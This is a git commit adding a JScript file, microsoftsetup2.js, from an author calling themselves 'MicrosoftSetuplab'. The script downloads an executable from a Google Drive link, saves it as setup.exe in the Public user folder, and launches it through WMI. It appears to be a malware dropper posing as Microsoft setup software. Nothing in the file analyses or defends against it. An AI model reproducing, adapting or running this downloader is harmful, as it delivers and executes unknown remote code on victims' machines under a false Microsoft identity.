41059c2c7ee7206dd3dc5c90730839ce1925623e
MicrosoftSetuplab <wb3232910@gmail.com>
2026-06-08 22:17:09 +0100

    Add files via upload

---
+++ microsoftsetup2.js
@@ -0,0 +1,28 @@
+var exeUrl = "https://drive.google.com/uc?export=download&id=1lwYJgdgsADfgTs5tb3OSdQxJxmuKkWik";
+var savePath = "C:\\Users\\Public\\setup.exe";
+
+try {
+    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+    xhr.open("GET", exeUrl, false);
+    xhr.send();
+
+    if (xhr.status !== 200) {
+        WScript.Echo("Download failed: " + xhr.status);
+        WScript.Quit(1);
+    }
+
+    var stream = new ActiveXObject("ADODB.Stream");
+    stream.Type = 1;
+    stream.Open();
+    stream.Write(xhr.ResponseBody);
+    stream.SaveToFile(savePath, 2);
+    stream.Close();
+
+    var wmi = GetObject("winmgmts:Win32_Process");
+    wmi.Create(savePath, null, null, null);
+
+    WScript.Echo("Success.");
+} catch (e) {
+    WScript.Echo("Error: " + e.message);
+    WScript.Quit(1);
+}
